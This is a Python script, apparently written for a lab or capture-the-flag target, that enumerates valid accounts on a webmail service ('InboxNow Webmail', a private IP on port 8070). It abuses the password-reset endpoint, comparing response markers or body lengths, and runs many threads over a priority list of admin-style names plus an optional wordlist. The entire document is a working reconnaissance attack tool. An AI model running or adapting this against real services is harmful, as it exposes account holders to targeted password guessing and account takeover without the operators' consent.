#!/usr/bin/env python3
"""
user_enum_forgot_pwd.py — High-speed multi-threaded username enumerator via password reset.
Originally developed for InboxNow Webmail (Port 8070).

Detects differences in password reset responses (marker presence or response body
length deltas) between valid and invalid usernames to enumerate active accounts.
"""

import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import sys
import time
import requests

DEFAULT_BASE = "http://10.110.3.72:8070"
DEFAULT_FORGOT = "/forgot"

SUCCESS_MARKERS = [
    "link has been sent",
    "check your inbox",
    "email has been sent",
    "password reset instructions",
]

FAILURE_MARKERS = [
    "user not found",
    "no user with that",
    "does not exist",
    "invalid username",
]

PRIORITY_USERS = [
    "postmaster", "admin", "administrator", "root",
    "user", "test", "support", "helpdesk", "webmaster"
]


def post_forgot(base_url: str, endpoint: str, username: str, user_field: str = "username", timeout: int = 4):
    url = f"{base_url}{endpoint}"
    try:
        r = requests.post(url, data={user_field: username}, timeout=timeout)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)


def body_text(html: str) -> str:
    txt = re.sub(r"<[^>]+>", " ", html or "")
    return re.sub(r"\s+", " ", txt).strip()


def calibrate(base_url: str, endpoint: str, known_valid: str, known_invalid: str, user_field: str):
    print("=" * 68)
    print("[*] Calibrating baseline responses...")
    print("=" * 68)

    s1, b1 = post_forgot(base_url, endpoint, known_valid, user_field)
    s2, b2 = post_forgot(base_url, endpoint, known_invalid, user_field)

    if not s1 or not s2:
        sys.exit(f"[-] Connection failed during calibration to {base_url}{endpoint}")

    has_succ_1 = any(m in (b1 or "").lower() for m in SUCCESS_MARKERS)
    has_succ_2 = any(m in (b2 or "").lower() for m in SUCCESS_MARKERS)

    if has_succ_1 and not has_succ_2:
        print("[+] Marker discriminator confirmed using SUCCESS_MARKERS.")
        return "marker", SUCCESS_MARKERS, None, None

    len_delta = abs(len(b1) - len(b2))
    if len_delta > 15:
        print(f"[+] Length delta discriminator confirmed (valid={len(b1)} bytes vs invalid={len(b2)} bytes).")
        return "length", None, len(b1), len(b2)

    print("[-] Warning: No clear discriminator between valid and invalid responses.")
    return "length", None, len(b1), len(b2)


def check_user(base_url: str, endpoint: str, user: str, mode: str, markers, v_len: int, i_len: int, user_field: str):
    code, body = post_forgot(base_url, endpoint, user, user_field)
    if not code:
        return user, False, "ERR"

    if mode == "marker":
        if any(m in body.lower() for m in markers):
            return user, True, body_text(body)[:60]
    elif mode == "length":
        if abs(len(body) - v_len) <= 5 and abs(len(body) - i_len) > 15:
            return user, True, f"len={len(body)}"

    return user, False, None


def main():
    parser = argparse.ArgumentParser(
        description="Password reset username enumerator."
    )
    parser.add_argument("--base", default=DEFAULT_BASE, help="Target base URL")
    parser.add_argument("--endpoint", default=DEFAULT_FORGOT, help="Forgot password endpoint")
    parser.add_argument("--field", default="username", help="Form field name (default: username)")
    parser.add_argument("--valid", default="user", help="Known valid user for baseline calibration")
    parser.add_argument("--invalid", default="nonexistent_xyz_99", help="Known invalid user for baseline calibration")
    parser.add_argument("--wordlist", help="Path to username wordlist file")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent worker threads (default: 10)")
    args = parser.parse_args()

    mode, markers, v_len, i_len = calibrate(args.base, args.endpoint, args.valid, args.invalid, args.field)

    candidates = list(PRIORITY_USERS)
    if args.wordlist:
        with open(args.wordlist, encoding="latin-1", errors="replace") as f:
            for line in f:
                w = line.strip()
                if w and w not in candidates:
                    candidates.append(w)

    print(f"\n[*] Starting enumeration of {len(candidates)} candidates with {args.threads} threads...\n")

    found = []
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {
            ex.submit(check_user, args.base, args.endpoint, u, mode, markers, v_len, i_len, args.field): u
            for u in candidates
        }
        for fut in as_completed(futures):
            user, is_valid, detail = fut.result()
            if is_valid:
                print(f"[+] VALID USER FOUND: {user:<20} ({detail})")
                found.append(user)

    print(f"\n[*] Finished. Total valid users discovered: {len(found)}")
    for u in found:
        print(f"  - {u}")


if __name__ == "__main__":
    main()
